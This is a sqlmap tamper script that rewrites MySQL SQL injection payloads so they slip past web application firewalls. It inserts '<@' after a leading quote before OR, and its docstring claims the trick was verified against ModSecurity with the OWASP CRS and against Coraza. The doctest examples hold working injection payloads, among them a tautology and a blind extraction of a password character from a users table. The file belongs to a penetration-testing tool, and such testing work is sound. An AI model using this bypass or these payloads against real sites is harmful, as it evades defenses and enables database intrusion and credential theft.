#!/usr/bin/env python

"""
Copyright (c) 2006-2026 sqlmap developers (https://sqlmap.org)
See the file 'LICENSE' for copying permission
"""

import os
import re

from lib.core.common import singleTimeWarnMessage
from lib.core.enums import DBMS
from lib.core.enums import PRIORITY

__priority__ = PRIORITY.HIGHEST

def dependencies():
    singleTimeWarnMessage("tamper script '%s' is only meant to be run against %s" % (os.path.basename(__file__).split(".")[0], DBMS.MYSQL))

def tamper(payload, **kwargs):
    """
    Adds '<@' right after a leading single quote followed by OR (e.g. ' OR 1=1-- - -> '<@ OR 1=1-- -)

    Requirement:
        * MySQL

    Tested against:
        * MySQL 5.5.62, 5.7.44, 8.0.36, 8.0.46, 8.4.9, 9.4.0
        * Percona 8.0.46

    Notes:
        * Useful to bypass web application firewalls in single-quoted injection points. For
          those, the only OWASP CRS rule that fires on a plain tautology is 942100 (i.e.
          libinjection), and libinjection does not model the '<@' sequence, so the resulting
          payload is rated benign
        * Verified against ModSecurity v3 with the OWASP CRS 3.3.10, ModSecurity v2 with the
          OWASP CRS 4.25.0 and Coraza with the CRS development branch (v4.29.0), all of them
          answering with HTTP 200
        * MySQL lexes the '@' as an (empty) user variable, hence ''<@ evaluates to NULL and the
          following OR still decides the predicate, e.g. "name=''<@ OR 1=1-- -" is a tautology
        * Only payloads where the quote is followed by OR (or ||) are processed, as NULL AND
          <condition> is NULL and would silently break AND based payloads
        * MariaDB rejects the sequence, hence MySQL and Percona only

    >>> tamper("' OR 1=1-- -")
    "'<@ OR 1=1-- -"
    >>> tamper("' OR LEFT((SELECT pw FROM users LIMIT 1),1)=0x73-- -")
    "'<@ OR LEFT((SELECT pw FROM users LIMIT 1),1)=0x73-- -"
    >>> tamper("' AND 1=1-- -")
    "' AND 1=1-- -"
    >>> tamper('-1 OR 1=1-- -')
    '-1 OR 1=1-- -'
    """

    return re.sub(r"(?i)\A'\s*(?=(?:OR|\|\|)\b)", "'<@ ", payload) if payload else payload
